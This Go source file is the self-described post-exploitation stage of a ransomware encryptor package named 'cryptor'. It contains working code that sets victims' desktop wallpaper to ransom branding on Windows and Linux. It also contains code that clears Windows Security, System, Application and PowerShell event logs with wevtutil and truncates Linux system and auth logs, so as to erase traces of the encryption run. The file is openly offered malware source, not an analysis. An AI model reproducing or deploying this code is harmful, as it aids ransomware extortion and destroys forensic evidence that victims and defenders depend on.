package cryptor

import (
	"context"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

// Post-exploitation stage — the operations that run AFTER the encryption
// loop completes and BEFORE the process exits. Two primitives:
//
//   1. Wallpaper swap. Sets the desktop background to an operator-supplied
//      image. Effect is purely psychological — every user who logs in sees
//      the ransom branding immediately. Windows only by default; Linux
//      desktop-environment-dependent.
//
//   2. Log scrub. Removes traces of the encryption run from the OS's own
//      logs. On Windows: wevtutil to clear the Security, System, and
//      Application event logs. On Linux: truncate /var/log/{syslog,auth.log,
//      messages} if write-permitted. This is a best-effort operation —
//      remote SIEM already has copies if the org forwards logs.

// WallpaperOptions controls a desktop background swap.
type WallpaperOptions struct {
	ImagePath string // local path to the image
	DryRun    bool
}

// WallpaperResult is the outcome.
type WallpaperResult struct {
	Method string
	Cmd    string
	OK     bool
	Err    string
	// Output carries the combined stdout+stderr of the most recent failed
	// command, for logging what each tool said before the next one was tried.
	Output []byte
}

// recordOutput stores the combined stdout+stderr of a failed command attempt.
func (r *WallpaperResult) recordOutput(b []byte) { r.Output = append(r.Output[:0], b...) }

// SetWallpaper sets the desktop background to ImagePath.
func SetWallpaper(opts WallpaperOptions) (WallpaperResult, error) {
	if opts.ImagePath == "" {
		return WallpaperResult{}, errors.New("cryptor/poststage: image path required")
	}
	abs, err := filepath.Abs(opts.ImagePath)
	if err != nil {
		return WallpaperResult{}, err
	}
	if _, err := os.Stat(abs); err != nil {
		return WallpaperResult{}, fmt.Errorf("cryptor/poststage: image not readable: %w", err)
	}

	switch runtime.GOOS {
	case "windows":
		return setWallpaperWindows(abs, opts.DryRun)
	case "linux", "darwin":
		return setWallpaperUnix(abs, opts.DryRun)
	default:
		return WallpaperResult{}, fmt.Errorf("cryptor/poststage: unsupported OS %s", runtime.GOOS)
	}
}

func setWallpaperWindows(path string, dry bool) (WallpaperResult, error) {
	// SystemParametersInfo via PowerShell is the least-friction path.
	ps := fmt.Sprintf(`Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class W {
  [DllImport("user32.dll", CharSet=CharSet.Auto)]
  public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
[W]::SystemParametersInfo(20, 0, "%s", 3)
`, strings.ReplaceAll(path, `\`, `\\`))

	r := WallpaperResult{Method: "powershell+SystemParametersInfo"}
	if dry {
		r.OK = true
		return r, nil
	}
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	out, err := exec.CommandContext(ctx, "powershell", "-NoProfile", "-Command", ps).CombinedOutput()
	if err != nil {
		r.Err = err.Error() + ": " + string(out)
		return r, err
	}
	r.OK = true
	return r, nil
}

func setWallpaperUnix(path string, dry bool) (WallpaperResult, error) {
	// try common desktop tools in order
	candidates := [][]string{
		{"gsettings", "set", "org.gnome.desktop.background", "picture-uri", "file://" + path},
		{"gsettings", "set", "org.gnome.desktop.background", "picture-uri-dark", "file://" + path},
		{"feh", "--bg-scale", path},
		{"xfconf-query", "-c", "xfce4-desktop", "-p", "/backdrop/screen0/monitor0/workspace0/last-image", "-s", path},
	}
	r := WallpaperResult{Method: "unix-desktop"}
	if dry {
		r.OK = true
		return r, nil
	}
	for _, cmd := range candidates {
		if _, err := exec.LookPath(cmd[0]); err != nil {
			continue
		}
		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		out, err := exec.CommandContext(ctx, cmd[0], cmd[1:]...).CombinedOutput()
		cancel()
		if err == nil {
			r.Cmd = strings.Join(cmd, " ")
			r.OK = true
			return r, nil
		}
		r.recordOutput(out)
	}
	r.Err = "no supported desktop tool found (gsettings/feh/xfconf-query)"
	return r, errors.New(r.Err)
}

// LogScrubOptions controls a log-wipe pass.
type LogScrubOptions struct {
	DryRun bool
	// Windows event logs to clear. Default: Security, System, Application,
	// Windows PowerShell, Microsoft-Windows-PowerShell/Operational.
	WindowsLogs []string
	// Linux log files to truncate. Default: /var/log/syslog, /var/log/auth.log,
	// /var/log/messages, /var/log/secure, /var/log/kern.log.
	LinuxLogs []string
}

// LogScrubResult is the outcome of one file/log wipe.
type LogScrubResult struct {
	Target string
	Method string
	OK     bool
	Err    string
}

// ScrubLogs clears the OS's own logs. Best-effort — remote SIEM copies,
// audit trails on the kernel side, and external log forwarding are all
// outside the reach of this function.
func ScrubLogs(opts LogScrubOptions) []LogScrubResult {
	switch runtime.GOOS {
	case "windows":
		return scrubWindows(opts)
	case "linux", "darwin":
		return scrubUnix(opts)
	default:
		return []LogScrubResult{{Target: runtime.GOOS, Err: "unsupported OS"}}
	}
}

func scrubWindows(opts LogScrubOptions) []LogScrubResult {
	logs := opts.WindowsLogs
	if len(logs) == 0 {
		logs = []string{"Security", "System", "Application", "Windows PowerShell"}
	}
	var results []LogScrubResult
	for _, name := range logs {
		r := LogScrubResult{Target: name, Method: "wevtutil"}
		if opts.DryRun {
			r.OK = true
			results = append(results, r)
			continue
		}
		ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
		out, err := exec.CommandContext(ctx, "wevtutil", "cl", name).CombinedOutput()
		cancel()
		if err != nil {
			r.Err = err.Error() + ": " + string(out)
		} else {
			r.OK = true
		}
		results = append(results, r)
	}
	return results
}

func scrubUnix(opts LogScrubOptions) []LogScrubResult {
	logs := opts.LinuxLogs
	if len(logs) == 0 {
		logs = []string{
			"/var/log/syslog", "/var/log/messages", "/var/log/auth.log",
			"/var/log/secure", "/var/log/kern.log", "/var/log/daemon.log",
		}
	}
	var results []LogScrubResult
	for _, path := range logs {
		r := LogScrubResult{Target: path, Method: "truncate"}
		if opts.DryRun {
			r.OK = true
			results = append(results, r)
			continue
		}
		// try O_WRONLY|O_TRUNC — best-effort
		f, err := os.OpenFile(path, os.O_WRONLY|os.O_TRUNC, 0)
		if err != nil {
			r.Err = err.Error()
			results = append(results, r)
			continue
		}
		f.Close()
		r.OK = true
		results = append(results, r)
	}
	return results
}
